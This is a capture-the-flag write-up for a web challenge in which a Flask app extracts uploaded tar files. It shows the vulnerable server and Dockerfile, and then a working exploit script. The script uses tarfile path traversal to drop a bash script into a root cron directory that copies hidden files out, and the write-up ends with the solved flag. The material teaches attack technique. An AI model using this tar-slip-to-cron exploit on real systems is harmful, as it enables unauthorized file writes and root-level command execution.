# File Sharing Portal

Category: WEB

Points: 478

Solves: 119

>Welcome to the file sharing portal! We only support tar files!

### TLDR

Get arbitary file upload via python `tarfile` module. Abuse a cron job that runs all files in a folder to write a bash script that copies the flag via `*.txt` into a folder `/uploads/a`. Access folder through website `/view` endpoint. Get flag filename and access through `/read` endpoint. 

### Solution

Let's first look through our given files and what we can do:

Server:
```py
#!/usr/bin/env python3
from flask import Flask, request, redirect, render_template, render_template_string
import tarfile
from hashlib import sha256
import os
app = Flask(__name__)

@app.route('/',methods=['GET','POST'])
def main():
    global username
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        file = request.files['file']
        if file.filename[-4:] != '.tar':
            return render_template_string("<p> We only support tar files as of right now!</p>")
        name = sha256(os.urandom(16)).digest().hex()
        os.makedirs(f"./uploads/{name}", exist_ok=True)
        file.save(f"./uploads/{name}/{name}.tar")
        try:
            tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
            tar_file.extractall(path=f'./uploads/{name}/')
            return render_template_string(f"<p>Tar file extracted! View <a href='/view/{name}'>here</a>")
        except:
            return render_template_string("<p>Failed to extract file!</p>")

@app.route('/view/<name>')
def view(name):
    if not all([i in "abcdef1234567890" for i in name]):
        return render_template_string("<p>Error!</p>")
        #print(os.popen(f'ls ./uploads/{name}').read())
            #print(name)
    files = os.listdir(f"./uploads/{name}")
    out = '<h1>Files</h1><br>'
    files.remove(f'{name}.tar')  # Remove the tar file from the list
    for i in files:
        out += f'<a href="/read/{name}/{i}">{i}</a>'
       # except:
    return render_template_string(out)

@app.route('/read/<name>/<file>')
def read(name,file):
    if (not all([i in "abcdef1234567890" for i in name])):
        return render_template_string("<p>Error!</p>")
    if ((".." in name) or (".." in file)) or (("/" in file) or "/" in name):
        return render_template_string("<p>Error!</p>")
    f = open(f'./uploads/{name}/{file}')
    data = f.read()
    f.close()
    return data

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

Docker:

```
FROM python:3.9-slim
RUN apt-get update && \
    apt-get install -y cron && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY requirements.txt server.py /app/
COPY templates/ /app/templates/
COPY uploads/ /app/uploads/
COPY REDACTED.txt /app/
# The flag file is redacted on purpose
RUN pip install --no-cache-dir -r requirements.txt
# Add the cron job to the crontab
RUN mkdir /etc/cron.custom
RUN echo "*/5 * * * * root rm -rf /app/uploads/*" > /etc/cron.custom/cleanup-cron
RUN echo "* * * * * root cd / && run-parts --report /etc/cron.custom" | tee -a /etc/crontab
# Give execution rights on the cron job
RUN chmod +x /etc/cron.custom/cleanup-cron
RUN crontab /etc/cron.custom/cleanup-cron
RUN crontab /etc/crontab
CMD ["sh", "-c", "cron && python server.py"]
```

Looks like we have a few endpoints:
1. Upload a tar file that will be extracted and stored in a random id folder in `./uploads`
2. View all files within a folder `./uploads/{random id}`
3. View content of file within a folder `./uploads/{random id}/{file name}`

There are a few restrictions that make this a bit annoying, most imporantly, our folder name can only consist of "abcdef1234567890" and our file can't contain any `..` or `/` so we won't be able to do LFI :< Further, we don't even know the file name of the flag as it's redacted in the docker file.

After thinking about LFI for a while, I decided to check out the tarfile library since I've never used it before, and see how it extracts files the only part we can interact with. After reading the [documentation](https://docs.python.org/3/library/tarfile.html), Jackpot, a vulnerability:

![Tarfile Vulnerability](/images/FileSharingPortalTarfileVuln.png)

Looks like using `extractall` like how the server is doing could lead to files being extracted outside the current directory, as a proof of concept I wrote a python script to help generate this bad tarfiles:

script:

```py
import tarfile
import os

# temp file
with open("temp.txt", 'w') as f:
    f.write("not important")

# create tar file and add 2 files to it
with tarfile.open('proofOfConcept.tar', 'w') as tar:
    tar.add('temp.txt', arcname='thisShouldShowUp') # specifies filename on extract
    tar.add('temp.txt', arcname='../thisShouldNotShowUp') #  ../ moves it out of the directory
```

POC:

![POC](/images/FileSharingPortalTarfilePOC.png)


BAM!!! very cool, we can now upload arbitary files to the servers file system (and even overwrite files if it shares the same name). But, from here what can we do, we still don't know the filename of flag nor can we perform any RCE to get the flag. After thinking through a few incorrect ideas (Overwritting python modules doesn't work since the server is only ran once, and everything will be cached, same thing with overwriting the server file, and most processes, screw caching fr) I realized that there was one way to get my file to run. If we look carefully back at the dockerfile we notice that there are some interesting cron jobs that are being performed:

```
# Add the cron job to the crontab
RUN mkdir /etc/cron.custom
RUN echo "*/5 * * * * root rm -rf /app/uploads/*" > /etc/cron.custom/cleanup-cron
RUN echo "* * * * * root cd / && run-parts --report /etc/cron.custom" | tee -a /etc/crontab
# Give execution rights on the cron job
RUN chmod +x /etc/cron.custom/cleanup-cron
RUN crontab /etc/cron.custom/cleanup-cron
RUN crontab /etc/crontab
CMD ["sh", "-c", "cron && python server.py"]
```

These cron jobs are daemons that will be performed in the background on a schedule while the main thread runs server.py. Let's see what the docker does and if we can get them to run our code. 
1. We first create a directory `/cron.custom` for custom cron processes in `/etc` 
2. Add a `cleanup-cron` file that defines a cron job where it removes all files from the `/uploads` folder (to save storage if we upload a lot of files) this job is then ran every 5 minutes.
3. Put a cron job (runs every minute) that uses `run-parts` to run all the files in `/etc/cron.custom` into current cron process stored in `crontab`
4. Give execution rights for cron jobs
5. Runs all the cron jobs made earlier

At first I tried to redefine builtin binaries like `rm` and `run-parts` with no luck (I think you can do it but I messed up something), Then I realized that I can add my own file (or overwrite cleanup-cron) in `/cron.custom`. The `run-parts` cron job would then execute my file every minute. But what commands should I run. After more trial and error, I ended up creating a folder `a` in uploads where I could move `*.txt` into. Then from the website I could go to `/view/a` and `REDACTED.txt` would be there. Now I just needed to code it up (with a lot of debugging in a local docker container):

```py
import tarfile
import os

os.makedirs('exploittar', exist_ok=True)
# create file to be run
with open('exploittar/temp.txt', 'w') as f:
    # shebang needed for run-parts (debugged in local docker)
    # copies all txt files from app into uploads/a folder
    f.write("#!/bin/bash\ncp /app/*.txt /app/uploads/a/.\n")

# also give the file executable writes so it can be run (debugged in local docker)
# today I learned that files preserve permission writes after being transfered and copied around
os.system("chmod +x exploittar/temp.txt")

# create exploit tar file
with tarfile.open('exploittar.tar', 'w') as tar:
    # adds exploit file to be put in cron.custom (rel path found in local docker)
    tar.add('exploittar/temp.txt', arcname='../../../etc/cron.custom/exploit')
    # creates folder 'a' inside uploads and file a.tar to make server happy
    # server attempts to remove *name*.tar from folder *name* before displaying
    # only arcname matters here
    tar.add('exploittar/temp.txt', arcname='../a/a.tar')

# Clean up temporary files
os.remove('exploittar/temp.txt')
os.rmdir('exploittar')
```

We can now upload this to the website and wait for a minute to pass:

![Upload](/images/FileSharingPortalExploit.png)

After 1 min:

![After 1 Minute](/images/FileSharingPortalExploitAfter1min.png)

NICE! It works, we have got the flag file:

![Flag](/images/FileSharingPortalFlag.png)

Definetely one of the more enjoyable/interesting challenges \:D

\*there are also a lot of unintended solutions such as ssti through filename or symlinks.
### Flag

```n00bz{n3v3r_7rus71ng_t4r_4g41n!_0894282b7aae}```